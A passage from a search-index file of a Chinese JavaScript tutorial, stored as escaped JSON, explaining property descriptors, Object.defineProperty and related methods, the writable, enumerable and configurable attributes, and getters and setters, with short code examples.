\uff0c\u4f1a\u4f7f\u5f97\u67d0\u4e9b\u64cd\u4f5c\uff08\u6bd4\u5982 for...in \u5faa\u73af\u3001 Object.keys() \uff09\u8df3\u8fc7\u8be5\u5c5e\u6027\u3002 \uff084\uff09 configurable configurable \u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5c5e\u6027\u7684\u53ef\u914d\u7f6e\u6027\uff0c\u9ed8\u8ba4\u4e3a true \u3002\u5982\u679c\u8bbe\u4e3a false \uff0c\u5c06\u963b\u6b62\u67d0\u4e9b\u64cd\u4f5c\u6539\u5199\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u6bd4\u5982\u65e0\u6cd5\u5220\u9664\u8be5\u5c5e\u6027\uff0c\u4e5f\u4e0d\u5f97\u6539\u53d8\u5404\u79cd\u5143\u5c5e\u6027\uff08 value \u5c5e\u6027\u9664\u5916\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c configurable \u5c5e\u6027\u63a7\u5236\u4e86\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684\u53ef\u5199\u6027\u3002 \uff085\uff09 get get \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u8868\u793a\u8be5\u5c5e\u6027\u7684\u53d6\u503c\u51fd\u6570\uff08getter\uff09\uff0c\u9ed8\u8ba4\u4e3a undefined \u3002 \uff086\uff09 set set \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u8868\u793a\u8be5\u5c5e\u6027\u7684\u5b58\u503c\u51fd\u6570\uff08setter\uff09\uff0c\u9ed8\u8ba4\u4e3a undefined \u3002","title":"\u6982\u8ff0"},{"location":"stdlib/attributes/#objectgetownpropertydescriptor","text":"Object.getOwnPropertyDescriptor() \u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u76ee\u6807\u5bf9\u8c61\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5bf9\u5e94\u76ee\u6807\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u540d\u3002 1 2 3 4 5 6 7 8 var obj = { p : 'a' }; Object . getOwnPropertyDescriptor ( obj , 'p' ) // Object { value: \"a\", // writable: true, // enumerable: true, // configurable: true // } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.getOwnPropertyDescriptor() \u65b9\u6cd5\u83b7\u53d6 obj.p \u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002 \u6ce8\u610f\uff0c Object.getOwnPropertyDescriptor() \u65b9\u6cd5\u53ea\u80fd\u7528\u4e8e\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u4e0d\u80fd\u7528\u4e8e\u7ee7\u627f\u7684\u5c5e\u6027\u3002 1 2 3 4 var obj = { p : 'a' }; Object . getOwnPropertyDescriptor ( obj , 'toString' ) // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toString \u662f obj \u5bf9\u8c61\u7ee7\u627f\u7684\u5c5e\u6027\uff0c Object.getOwnPropertyDescriptor() \u65e0\u6cd5\u83b7\u53d6\u3002","title":"Object.getOwnPropertyDescriptor()"},{"location":"stdlib/attributes/#objectgetownpropertynames","text":"Object.getOwnPropertyNames \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u53c2\u6570\u5bf9\u8c61\u81ea\u8eab\u7684\u5168\u90e8\u5c5e\u6027\u7684\u5c5e\u6027\u540d\uff0c\u4e0d\u7ba1\u8be5\u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\u3002 1 2 3 4 5 6 7 var obj = Object . defineProperties ({}, { p1 : { value : 1 , enumerable : true }, p2 : { value : 2 , enumerable : false } }); Object . getOwnPropertyNames ( obj ) // [\"p1\", \"p2\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p1 \u662f\u53ef\u904d\u5386\u7684\uff0c obj.p2 \u662f\u4e0d\u53ef\u904d\u5386\u7684\u3002 Object.getOwnPropertyNames \u4f1a\u5c06\u5b83\u4eec\u90fd\u8fd4\u56de\u3002 \u8fd9\u8ddf Object.keys \u7684\u884c\u4e3a\u4e0d\u540c\uff0c Object.keys \u53ea\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\u7684\u53ef\u904d\u5386\u5c5e\u6027\u7684\u5168\u90e8\u5c5e\u6027\u540d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 Object . keys ([]) // [] Object . getOwnPropertyNames ([]) // [ 'length' ] Object . keys ( Object . prototype ) // [] Object . getOwnPropertyNames ( Object . prototype ) // ['hasOwnProperty', // 'valueOf', // 'constructor', // 'toLocaleString', // 'isPrototypeOf', // 'propertyIsEnumerable', // 'toString'] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u81ea\u8eab\u7684 length \u5c5e\u6027\u662f\u4e0d\u53ef\u904d\u5386\u7684\uff0c Object.keys \u4e0d\u4f1a\u8fd4\u56de\u8be5\u5c5e\u6027\u3002\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684 Object.prototype \u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u4f1a\u7ee7\u627f\u5b83\uff0c\u5b83\u81ea\u8eab\u7684\u5c5e\u6027\u90fd\u662f\u4e0d\u53ef\u904d\u5386\u7684\u3002","title":"Object.getOwnPropertyNames()"},{"location":"stdlib/attributes/#objectdefinepropertyobjectdefineproperties","text":"Object.defineProperty() \u65b9\u6cd5\u5141\u8bb8\u901a\u8fc7\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b9a\u4e49\u6216\u4fee\u6539\u4e00\u4e2a\u5c5e\u6027\uff0c\u7136\u540e\u8fd4\u56de\u4fee\u6539\u540e\u7684\u5bf9\u8c61\uff0c\u5b83\u7684\u7528\u6cd5\u5982\u4e0b\u3002 1 Object . defineProperty ( object , propertyName , attributesObject ) Object.defineProperty \u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u5982\u4e0b\u3002 object\uff1a\u5c5e\u6027\u6240\u5728\u7684\u5bf9\u8c61 propertyName\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5c5e\u6027\u540d attributesObject\uff1a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5b9a\u4e49 obj.p \u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = Object . defineProperty ({}, 'p' , { value : 123 , writable : false , enumerable : true , configurable : false }); obj . p // 123 obj . p = 246 ; obj . p // 123 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.defineProperty() \u65b9\u6cd5\u5b9a\u4e49\u4e86 obj.p \u5c5e\u6027\u3002\u7531\u4e8e\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 writable \u5c5e\u6027\u4e3a false \uff0c\u6240\u4ee5 obj.p \u5c5e\u6027\u4e0d\u53ef\u5199\u3002\u6ce8\u610f\uff0c\u8fd9\u91cc\u7684 Object.defineProperty \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f {} \uff08\u4e00\u4e2a\u65b0\u5efa\u7684\u7a7a\u5bf9\u8c61\uff09\uff0c p \u5c5e\u6027\u76f4\u63a5\u5b9a\u4e49\u5728\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u4e0a\u9762\uff0c\u7136\u540e\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u662f Object.defineProperty() \u7684\u5e38\u89c1\u7528\u6cd5\u3002 \u5982\u679c\u5c5e\u6027\u5df2\u7ecf\u5b58\u5728\uff0c Object.defineProperty() \u65b9\u6cd5\u76f8\u5f53\u4e8e\u66f4\u65b0\u8be5\u5c5e\u6027\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002 \u5982\u679c\u4e00\u6b21\u6027\u5b9a\u4e49\u6216\u4fee\u6539\u591a\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528 Object.defineProperties() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var obj = Object . defineProperties ({}, { p1 : { value : 123 , enumerable : true }, p2 : { value : 'abc' , enumerable : true }, p3 : { get : function () { return this . p1 + this . p2 }, enumerable : true , configurable : true } }); obj . p1 // 123 obj . p2 // \"abc\" obj . p3 // \"123abc\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.defineProperties() \u540c\u65f6\u5b9a\u4e49\u4e86 obj \u5bf9\u8c61\u7684\u4e09\u4e2a\u5c5e\u6027\u3002\u5176\u4e2d\uff0c p3 \u5c5e\u6027\u5b9a\u4e49\u4e86\u53d6\u503c\u51fd\u6570 get \uff0c\u5373\u6bcf\u6b21\u8bfb\u53d6\u8be5\u5c5e\u6027\uff0c\u90fd\u4f1a\u8c03\u7528\u8fd9\u4e2a\u53d6\u503c\u51fd\u6570\u3002 \u6ce8\u610f\uff0c\u4e00\u65e6\u5b9a\u4e49\u4e86\u53d6\u503c\u51fd\u6570 get \uff08\u6216\u5b58\u503c\u51fd\u6570 set \uff09\uff0c\u5c31\u4e0d\u80fd\u5c06 writable \u5c5e\u6027\u8bbe\u4e3a true \uff0c\u6216\u8005\u540c\u65f6\u5b9a\u4e49 value \u5c5e\u6027\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var obj = {}; Object . defineProperty ( obj , 'p' , { value : 123 , get : function () { return 456 ; } }); // TypeError: Invalid property. // A property cannot both have accessors and be writable or have a value Object . defineProperty ( obj , 'p' , { writable : true , get : function () { return 456 ; } }); // TypeError: Invalid property descriptor. // Cannot both specify accessors and a value or writable attribute \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u540c\u65f6\u5b9a\u4e49\u4e86 get \u5c5e\u6027\u548c value \u5c5e\u6027\uff0c\u4ee5\u53ca\u5c06 writable \u5c5e\u6027\u8bbe\u4e3a true \uff0c\u5c31\u4f1a\u62a5\u9519\u3002 Object.defineProperty() \u548c Object.defineProperties() \u53c2\u6570\u91cc\u9762\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c writable \u3001 configurable \u3001 enumerable \u8fd9\u4e09\u4e2a\u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u90fd\u4e3a false \u3002 1 2 3 4 5 6 7 8 9 var obj = {}; Object . defineProperty ( obj , 'foo' , {}); Object . getOwnPropertyDescriptor ( obj , 'foo' ) // { // value: undefined, // writable: false, // enumerable: false, // configurable: false // } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9a\u4e49 obj.foo \u65f6\u7528\u4e86\u4e00\u4e2a\u7a7a\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u5404\u4e2a\u5143\u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u3002","title":"Object.defineProperty()\uff0cObject.defineProperties()"},{"location":"stdlib/attributes/#objectprototypepropertyisenumerable","text":"\u5b9e\u4f8b\u5bf9\u8c61\u7684 propertyIsEnumerable() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u7528\u6765\u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u80fd\u7528\u4e8e\u5224\u65ad\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u5bf9\u4e8e\u7ee7\u627f\u7684\u5c5e\u6027\u4e00\u5f8b\u8fd4\u56de false \u3002 1 2 3 4 5 var obj = {}; obj . p = 123 ; obj . propertyIsEnumerable ( 'p' ) // true obj . propertyIsEnumerable ( 'toString' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p \u662f\u53ef\u904d\u5386\u7684\uff0c\u800c obj.toString \u662f\u7ee7\u627f\u7684\u5c5e\u6027\u3002","title":"Object.prototype.propertyIsEnumerable()"},{"location":"stdlib/attributes/#_3","text":"\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684\u5404\u4e2a\u5c5e\u6027\u79f0\u4e3a\u201c\u5143\u5c5e\u6027\u201d\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ef\u4ee5\u770b\u4f5c\u662f\u63a7\u5236\u5c5e\u6027\u7684\u5c5e\u6027\u3002","title":"\u5143\u5c5e\u6027"},{"location":"stdlib/attributes/#value","text":"value \u5c5e\u6027\u662f\u76ee\u6807\u5c5e\u6027\u7684\u503c\u3002 1 2 3 4 5 6 7 8 var obj = {}; obj . p = 123 ; Object . getOwnPropertyDescriptor ( obj , 'p' ). value // 123 Object . defineProperty ( obj , 'p' , { value : 246 }); obj . p // 246 \u4e0a\u9762\u4ee3\u7801\u662f\u901a\u8fc7 value \u5c5e\u6027\uff0c\u8bfb\u53d6\u6216\u6539\u5199 obj.p \u7684\u4f8b\u5b50\u3002","title":"value"},{"location":"stdlib/attributes/#writable","text":"writable \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u51b3\u5b9a\u4e86\u76ee\u6807\u5c5e\u6027\u7684\u503c\uff08value\uff09\u662f\u5426\u53ef\u4ee5\u88ab\u6539\u53d8\u3002 1 2 3 4 5 6 7 8 9 10 var obj = {}; Object . defineProperty ( obj , 'a' , { value : 37 , writable : false }); obj . a // 37 obj . a = 25 ; obj . a // 37 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.a \u7684 writable \u5c5e\u6027\u662f false \u3002\u7136\u540e\uff0c\u6539\u53d8 obj.a \u7684\u503c\uff0c\u4e0d\u4f1a\u6709\u4efb\u4f55\u6548\u679c\u3002 \u6ce8\u610f\uff0c\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u5bf9 writable \u4e3a false \u7684\u5c5e\u6027\u8d4b\u503c\u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u4f1a\u9ed8\u9ed8\u5931\u8d25\u3002\u4f46\u662f\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\u4f1a\u62a5\u9519\uff0c\u5373\u4f7f\u5bf9 a \u5c5e\u6027\u91cd\u65b0\u8d4b\u4e88\u4e00\u4e2a\u540c\u6837\u7684\u503c\u3002 1 2 3 4 5 6 7 8 9 10 'use strict' ; var obj = {}; Object . defineProperty ( obj , 'a' , { value : 37 , writable : false }); obj . a = 37 ; // Uncaught TypeError: Cannot assign to read only property 'a' of object \u4e0a\u9762\u4ee3\u7801\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u5bf9 obj.a \u4efb\u4f55\u8d4b\u503c\u884c\u4e3a\u90fd\u4f1a\u62a5\u9519\u3002 \u5982\u679c\u539f\u578b\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u7684 writable \u4e3a false \uff0c\u90a3\u4e48\u5b50\u5bf9\u8c61\u5c06\u65e0\u6cd5\u81ea\u5b9a\u4e49\u8fd9\u4e2a\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 var proto = Object . defineProperty ({}, 'foo' , { value : 'a' , writable : false }); var obj = Object . create ( proto ); obj . foo = 'b' ; obj . foo // 'a' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c proto \u662f\u539f\u578b\u5bf9\u8c61\uff0c\u5b83\u7684 foo \u5c5e\u6027\u4e0d\u53ef\u5199\u3002 obj \u5bf9\u8c61\u7ee7\u627f proto \uff0c\u4e5f\u4e0d\u53ef\u4ee5\u518d\u81ea\u5b9a\u4e49\u8fd9\u4e2a\u5c5e\u6027\u4e86\u3002\u5982\u679c\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u6837\u505a\u8fd8\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 \u4f46\u662f\uff0c\u6709\u4e00\u4e2a\u89c4\u907f\u65b9\u6cd5\uff0c\u5c31\u662f\u901a\u8fc7\u8986\u76d6\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u3002\u539f\u56e0\u662f\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u539f\u578b\u94fe\u4f1a\u88ab\u5b8c\u5168\u5ffd\u89c6\u3002 1 2 3 4 5 6 7 8 9 10 11 var proto = Object . defineProperty ({}, 'foo' , { value : 'a' , writable : false }); var obj = Object . create ( proto ); Object . defineProperty ( obj , 'foo' , { value : 'b' }); obj . foo // \"b\"","title":"writable"},{"location":"stdlib/attributes/#enumerable","text":"enumerable \uff08\u53ef\u904d\u5386\u6027\uff09\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u76ee\u6807\u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\u3002 JavaScript \u7684\u65e9\u671f\u7248\u672c\uff0c for...in \u5faa\u73af\u662f\u57fa\u4e8e in \u8fd0\u7b97\u7b26\u7684\u3002\u6211\u4eec\u77e5\u9053\uff0c in \u8fd0\u7b97\u7b26\u4e0d\u7ba1\u67d0\u4e2a\u5c5e\u6027\u662f\u5bf9\u8c61\u81ea\u8eab\u7684\u8fd8\u662f\u7ee7\u627f\u7684\uff0c\u90fd\u4f1a\u8fd4\u56de true \u3002 1 2 var obj = {}; 'toString' in obj // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toString \u4e0d\u662f obj \u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u4f46\u662f in \u8fd0\u7b97\u7b26\u4e5f\u8fd4\u56de true \uff0c\u8fd9\u5bfc\u81f4\u4e86 toString \u5c5e\u6027\u4e5f\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\u3002 \u8fd9\u663e\u7136\u4e0d\u592a\u5408\u7406\uff0c\u540e\u6765\u5c31\u5f15\u5165\u4e86\u201c\u53ef\u904d\u5386\u6027\u201d\u8fd9\u4e2a\u6982\u5ff5\u3002\u53ea\u6709\u53ef\u904d\u5386\u7684\u5c5e\u6027\uff0c\u624d\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\uff0c\u540c\u65f6\u8fd8\u89c4\u5b9a toString \u8fd9\u4e00\u7c7b\u5b9e\u4f8b\u5bf9\u8c61\u7ee7\u627f\u7684\u539f\u751f\u5c5e\u6027\uff0c\u90fd\u662f\u4e0d\u53ef\u904d\u5386\u7684\uff0c\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86 for...in \u5faa\u73af\u7684\u53ef\u7528\u6027\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u5c5e\u6027\u7684 enumerable \u4e3a false \uff0c\u4e0b\u9762\u4e09\u4e2a\u64cd\u4f5c\u4e0d\u4f1a\u53d6\u5230\u8be5\u5c5e\u6027\u3002 for..in \u5faa\u73af Object.keys \u65b9\u6cd5 JSON.stringify \u65b9\u6cd5 \u56e0\u6b64\uff0c enumerable \u53ef\u4ee5\u7528\u6765\u8bbe\u7f6e\u201c\u79d8\u5bc6\u201d\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var obj = {}; Object . defineProperty ( obj , 'x' , { value : 123 , enumerable : false }); obj . x // 123 for ( var key in obj ) { console . log ( key ); } // undefined Object . keys ( obj ) // [] JSON . stringify ( obj ) // \"{}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.x \u5c5e\u6027\u7684 enumerable \u4e3a false \uff0c\u6240\u4ee5\u4e00\u822c\u7684\u904d\u5386\u64cd\u4f5c\u90fd\u65e0\u6cd5\u83b7\u53d6\u8be5\u5c5e\u6027\uff0c\u4f7f\u5f97\u5b83\u6709\u70b9\u50cf\u201c\u79d8\u5bc6\u201d\u5c5e\u6027\uff0c\u4f46\u4e0d\u662f\u771f\u6b63\u7684\u79c1\u6709\u5c5e\u6027\uff0c\u8fd8\u662f\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5b83\u7684\u503c\u3002 \u6ce8\u610f\uff0c for...in \u5faa\u73af\u5305\u62ec\u7ee7\u627f\u7684\u5c5e\u6027\uff0c Object.keys \u65b9\u6cd5\u4e0d\u5305\u62ec\u7ee7\u627f\u7684\u5c5e\u6027\u3002\u5982\u679c\u9700\u8981\u83b7\u53d6\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709\u5c5e\u6027\uff0c\u4e0d\u7ba1\u662f\u5426\u53ef\u904d\u5386\uff0c\u53ef\u4ee5\u4f7f\u7528 Object.getOwnPropertyNames \u65b9\u6cd5\u3002 \u53e6\u5916\uff0c JSON.stringify \u65b9\u6cd5\u4f1a\u6392\u9664 enumerable \u4e3a false \u7684\u5c5e\u6027\uff0c\u6709\u65f6\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u3002\u5982\u679c\u5bf9\u8c61\u7684 JSON \u683c\u5f0f\u8f93\u51fa\u8981\u6392\u9664\u67d0\u4e9b\u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u628a\u8fd9\u4e9b\u5c5e\u6027\u7684 enumerable \u8bbe\u4e3a false \u3002","title":"enumerable"},{"location":"stdlib/attributes/#configurable","text":"configurable (\u53ef\u914d\u7f6e\u6027\uff09\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u51b3\u5b9a\u4e86\u662f\u5426\u53ef\u4ee5\u4fee\u6539\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c configurable \u4e3a false \u65f6\uff0c writable \u3001 enumerable \u548c configurable \u90fd\u4e0d\u80fd\u88ab\u4fee\u6539\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var obj = Object . defineProperty ({}, 'p' , { value : 1 , writable : false , enumerable : false , configurable : false }); Object . defineProperty ( obj , 'p' , { writable : true }) // TypeError: Cannot redefine property: p Object . defineProperty ( obj , 'p' , { enumerable : true }) // TypeError: Cannot redefine property: p Object . defineProperty ( obj , 'p' , { configurable : true }) // TypeError: Cannot redefine property: p Object . defineProperty ( obj , 'p' , { value : 2 }) // TypeError: Cannot redefine property: p \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p \u7684 configurable \u5c5e\u6027\u4e3a false \u3002\u7136\u540e\uff0c\u6539\u52a8 writable \u3001 enumerable \u3001 configurable \uff0c\u7ed3\u679c\u90fd\u62a5\u9519\u3002 \u6ce8\u610f\uff0c writable \u5c5e\u6027\u53ea\u6709\u5728 false \u6539\u4e3a true \u65f6\u4f1a\u62a5\u9519\uff0c true \u6539\u4e3a false \u662f\u5141\u8bb8\u7684\u3002 1 2 3 4 5 6 7 var obj = Object . defineProperty ({}, 'p' , { writable : true , configurable : false }); Object . defineProperty ( obj , 'p' , { writable : false }) // \u4fee\u6539\u6210\u529f value \u5c5e\u6027\u7684\u60c5\u51b5\u6bd4\u8f83\u7279\u6b8a\u3002\u53ea\u8981 writable \u548c configurable \u6709\u4e00\u4e2a\u4e3a true \uff0c\u5c31\u5141\u8bb8\u6539\u52a8 value \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var o1 = Object . defineProperty ({}, 'p' , { value : 1 , writable : true , configurable : false }); Object . defineProperty ( o1 , 'p' , { value : 2 }) // \u4fee\u6539\u6210\u529f var o2 = Object . defineProperty ({}, 'p' , { value : 1 , writable : false , configurable : true }); Object . defineProperty ( o2 , 'p' , { value : 2 }) // \u4fee\u6539\u6210\u529f \u53e6\u5916\uff0c writable \u4e3a false \u65f6\uff0c\u76f4\u63a5\u5bf9\u76ee\u6807\u5c5e\u6027\u8d4b\u503c\uff0c\u4e0d\u62a5\u9519\uff0c\u4f46\u4e0d\u4f1a\u6210\u529f\u3002 1 2 3 4 5 6 7 8 var obj = Object . defineProperty ({}, 'p' , { value : 1 , writable : false , configurable : false }); obj . p = 2 ; obj . p // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p \u7684 writable \u4e3a false \uff0c\u5bf9 obj.p \u76f4\u63a5\u8d4b\u503c\u4e0d\u4f1a\u751f\u6548\u3002\u5982\u679c\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd8\u4f1a\u62a5\u9519\u3002 \u53ef\u914d\u7f6e\u6027\u51b3\u5b9a\u4e86\u76ee\u6807\u5c5e\u6027\u662f\u5426\u53ef\u4ee5\u88ab\u5220\u9664\uff08delete\uff09\u3002 1 2 3 4 5 6 7 8 9 10 var obj = Object . defineProperties ({}, { p1 : { value : 1 , configurable : true }, p2 : { value : 2 , configurable : false } }); delete obj . p1 // true delete obj . p2 // false obj . p1 // undefined obj . p2 // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p1 \u7684 configurable \u662f true \uff0c\u6240\u4ee5\u53ef\u4ee5\u88ab\u5220\u9664\uff0c obj.p2 \u5c31\u65e0\u6cd5\u5220\u9664\u3002","title":"configurable"},{"location":"stdlib/attributes/#_4","text":"\u9664\u4e86\u76f4\u63a5\u5b9a\u4e49\u4ee5\u5916\uff0c\u5c5e\u6027\u8fd8\u53ef\u4ee5\u7528\u5b58\u53d6\u5668\uff08accessor\uff09\u5b9a\u4e49\u3002\u5176\u4e2d\uff0c\u5b58\u503c\u51fd\u6570\u79f0\u4e3a setter \uff0c\u4f7f\u7528\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 set \u5c5e\u6027\uff1b\u53d6\u503c\u51fd\u6570\u79f0\u4e3a getter \uff0c\u4f7f\u7528\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 get \u5c5e\u6027\u3002 \u4e00\u65e6\u5bf9\u76ee\u6807\u5c5e\u6027\u5b9a\u4e49\u4e86\u5b58\u53d6\u5668\uff0c\u90a3\u4e48\u5b58\u53d6\u7684\u65f6\u5019\uff0c\u90fd\u5c06\u6267\u884c\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u5229\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8bb8\u591a\u9ad8\u7ea7\u7279\u6027\uff0c\u6bd4\u5982\u5b9a\u5236\u5c5e\u6027\u7684\u8bfb\u53d6\u548c\u8d4b\u503c\u884c\u4e3a\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = Object . defineProperty ({}, 'p' , { get : function () { return 'getter' ; }, set : function ( value ) { console . log ( 'setter: ' + value ); } }); obj . p // \"getter\" obj . p = 123 // \"setter: 123\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p \u5b9a\u4e49\u4e86 get \u548c set \u5c5e\u6027\u3002 obj.p \u53d6\u503c\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 get \uff1b\u8d4b\u503c\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 set \u3002 JavaScript \u8fd8\u63d0\u4f9b\u4e86\u5b58\u53d6\u5668\u7684\u53e6\u4e00\u79cd\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 // \u5199\u6cd5\u4e8c var obj = { get p () { return 'getter' ; }, set p ( value ) { console . log ( 'setter: ' + value ); } }; \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\uff0c\u867d\u7136\u5c5e\u6027 p \u7684\u8bfb\u53d6\u548c\u8d4b\u503c\u884c\u4e3a\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u6709\u4e00\u4e9b\u7ec6\u5fae\u7684\u533a\u522b\u3002\u7b2c\u4e00\u79cd\u5199\u6cd5\uff0c\u5c5e\u6027 p \u7684 configurable \u548c enumerable \u90fd\u4e3a false \uff0c\u4ece\u800c\u5bfc\u81f4\u5c5e\u6027 p \u662f\u4e0d\u53ef\u904d\u5386\u7684\uff1b\u7b2c\u4e8c\u79cd\u5199\u6cd5\uff0c\u5c5e\u6027 p \u7684 configurable \u548c enumerable \u90fd\u4e3a true \uff0c\u56e0\u6b64\u5c5e\u6027 p \u662f\u53ef\u904d\u5386\u7684\u3002\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u5199\u6cd5\u4e8c\u66f4\u5e38\u7528\u3002 \u6ce8\u610f\uff0c\u53d6\u503c\u51fd\u6570 get \u4e0d\u80fd\u63a5\u53d7\u53c2\u6570\uff0c\u5b58\u503c\u51fd\u6570 set \u53ea\u80fd\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff08\u5373\u5c5e\u6027\u7684\u503c\uff09\u3002 \u5b58\u53d6\u5668\u5f80\u5f80\u7528\u4e8e\uff0c\u5c5e\u6027\u7684\u503c\u4f9d\u8d56\u5bf9\u8c61\u5185\u90e8\u6570\u636e\u7684\u573a\u5408\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var obj = { $n : 5 , get next () { return this . $n ++ }, set next ( n ) { if ( n >= this . $n ) this . $n = n ; else throw new Error ( '\u65b0\u7684\u503c\u5fc5\u987b\u5927\u4e8e\u5f53\u524d\u503c' ); } }; obj . next // 5 obj . next = 